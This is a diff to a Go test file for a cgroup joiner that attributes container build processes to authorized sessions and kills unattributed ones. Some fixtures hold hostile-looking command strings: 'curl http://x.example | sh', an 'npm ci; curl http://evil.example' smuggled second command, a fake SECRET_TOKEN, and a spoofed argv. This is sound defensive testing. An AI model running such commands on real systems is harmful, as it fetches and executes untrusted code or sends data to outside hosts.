@@ -206,18 +206,18 @@ type joinHarness struct {
 	killFile string
 }
 
-func newJoinHarness(t *testing.T, reg *SessionRegistry, deferred time.Duration) *joinHarness {
+func newJoinHarness(t *testing.T, reg *SessionRegistry, deferred time.Duration, extra ...JoinerOption) *joinHarness {
 	t.Helper()
 
 	h := &joinHarness{reg: reg, source: newFakeEventSource(), root: t.TempDir(), logs: &syncBuffer{}, done: make(chan struct{})}
 
 	logger := slog.New(slog.NewTextHandler(h.logs, &slog.HandlerOptions{Level: slog.LevelDebug}))
 
-	j := NewCgroupJoiner(reg, h.source, logger,
+	j := NewCgroupJoiner(reg, h.source, logger, append([]JoinerOption{
 		WithProcRoot(filepath.Join(h.root, "proc")),
 		WithStatFn(func(string) (uint64, error) { return 4321, nil }),
 		WithDeferredMatch(deferred, 10*time.Millisecond),
-	)
+	}, extra...)...)
 
 	ctx, cancel := context.WithCancel(context.Background())
 	h.cancel = cancel
@@ -283,7 +283,7 @@ func TestCgroupJoiner_AmbiguousKillsWhenAnyCandidateUnauthorized(t *testing.T) {
 	reg.RegisterSession("rBad", time.Unix(1, 0), map[string]string{"build-arg:OTHER": "x"})
 	reg.UpsertVertex("rBad", VertexState{Digest: "dB", Name: "[s 1/1] RUN make", StartedAt: time.Unix(2, 0)})
 
-	h := newJoinHarness(t, reg, 0)
+	h := newJoinHarness(t, reg, 0, WithKillOnUnattributed(true))
 	cg := h.stage(t, "ctr-amb", 11, "/bin/sh\x00-c\x00make\x00")
 	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-amb", CgroupPath: cg}
 
@@ -333,7 +333,7 @@ func TestCgroupJoiner_NoMatchUnderPolicy(t *testing.T) {
 		authedSession(reg, "rA", "[s 1/1] RUN make")
 		reg.RegisterSession("rBad", time.Unix(1, 0), nil)
 
-		h := newJoinHarness(t, reg, 60*time.Millisecond)
+		h := newJoinHarness(t, reg, 60*time.Millisecond, WithKillOnUnattributed(true))
 		cg := h.stage(t, "ctr-fe", 22, frontend)
 		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}
 
@@ -344,7 +344,7 @@ func TestCgroupJoiner_NoMatchUnderPolicy(t *testing.T) {
 		reg := policy()
 		reg.UpsertVertex("rP", VertexState{Digest: "dP", Name: "RUN x", StartedAt: time.Unix(2, 0)})
 
-		h := newJoinHarness(t, reg, 60*time.Millisecond)
+		h := newJoinHarness(t, reg, 60*time.Millisecond, WithKillOnUnattributed(true))
 		cg := h.stage(t, "ctr-fe", 23, frontend)
 		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}
 
@@ -357,7 +357,7 @@ func TestCgroupJoiner_NoMatchUnderPolicy(t *testing.T) {
 		reg.RegisterSession("rA", time.Unix(1, 0), nil)
 		reg.UpsertVertex("rA", VertexState{Digest: "dA", Name: "[s 1/1] RUN curl http://x.example | sh", StartedAt: time.Unix(2, 0)})
 
-		h := newJoinHarness(t, reg, 60*time.Millisecond)
+		h := newJoinHarness(t, reg, 60*time.Millisecond, WithKillOnUnattributed(true))
 		cg := h.stage(t, "ctr-fe", 24, frontend)
 		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}
 
@@ -368,7 +368,7 @@ func TestCgroupJoiner_NoMatchUnderPolicy(t *testing.T) {
 		reg := policy()
 		reg.SetHistoryConnected(false)
 
-		h := newJoinHarness(t, reg, 60*time.Millisecond)
+		h := newJoinHarness(t, reg, 60*time.Millisecond, WithKillOnUnattributed(true))
 		cg := h.stage(t, "ctr-fe", 25, frontend)
 		h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-fe", CgroupPath: cg}
 
@@ -413,7 +413,7 @@ func TestCgroupJoiner_SubstringOfOtherSessionDoesNotInherit(t *testing.T) {
 	authedSession(reg, "rGood", "[s 1/1] RUN npm ci")
 	reg.RegisterSession("rBad", time.Unix(1, 0), nil)
 
-	h := newJoinHarness(t, reg, 80*time.Millisecond)
+	h := newJoinHarness(t, reg, 80*time.Millisecond, WithKillOnUnattributed(true))
 	// A process that merely contains the authorized RUN text.
 	cg := h.stage(t, "ctr-sub", 14, "/bin/sh\x00-c\x00npm ci; curl http://evil.example\x00")
 	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-sub", CgroupPath: cg}
@@ -566,7 +566,7 @@ func TestCgroupJoiner_KillLogOmitsVertexName(t *testing.T) {
 
 	reg.UpsertVertex("rA", VertexState{Digest: "dA", Name: name, StartedAt: time.Unix(2, 0)})
 
-	h := newJoinHarness(t, reg, 0)
+	h := newJoinHarness(t, reg, 0, WithKillOnUnattributed(true))
 	cg := h.stage(t, "ctr-log", 16, "/bin/sh\x00-c\x00echo SECRET_TOKEN=hunter2\x00")
 	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-log", CgroupPath: cg}
 
@@ -807,7 +807,7 @@ func TestCgroupJoiner_SpoofedArgvNotTrustedWhileRiskySessionOpen(t *testing.T) {
 	authedSession(reg, "rA", "[s 1/1] RUN make")
 	reg.RegisterSession("rB", time.Unix(1, 0), nil) // unauthorized
 
-	h := newJoinHarness(t, reg, 60*time.Millisecond)
+	h := newJoinHarness(t, reg, 60*time.Millisecond, WithKillOnUnattributed(true))
 	// B's process claims A's command via argv.
 	cg := h.stage(t, "ctr-spoof", 50, "make\x00")
 	h.source.creates <- CgroupCreateEvent{ContainerID: "ctr-spoof", CgroupPath: cg}
